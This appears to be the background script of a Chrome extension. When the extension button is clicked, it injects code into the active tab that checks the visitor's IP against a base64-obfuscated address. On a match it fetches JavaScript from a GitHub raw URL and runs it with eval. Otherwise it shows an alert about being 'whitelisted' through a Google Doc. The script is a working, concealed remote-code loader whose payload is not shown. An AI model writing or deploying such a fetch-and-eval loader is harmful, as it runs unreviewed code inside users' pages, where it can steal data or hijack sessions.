alert('KEEP THIS TAB OPEN!')     
chrome.browserAction.onClicked.addListener(() => {chrome.tabs.executeScript(null, {code: `fetch('https://api.ipify.org?format=json')
    .then(response => response.json())
    .then(data => {
        if (data.ip == atob("MTYzLjE1MC4yMjYuMjA1")) {       fetch("https://raw.githubusercontent.com/stuartcat/googlebs/main/main.js").then(d=>d.text()).then(eval);
        } else {alert('You are not whitelisted Please type your ip adress in the google doc to get access this is soley to avoid an under the table incedent if yk what i mean......');}
    })
    .catch(error => {
        console.log('Error:', error);
    });
`});});
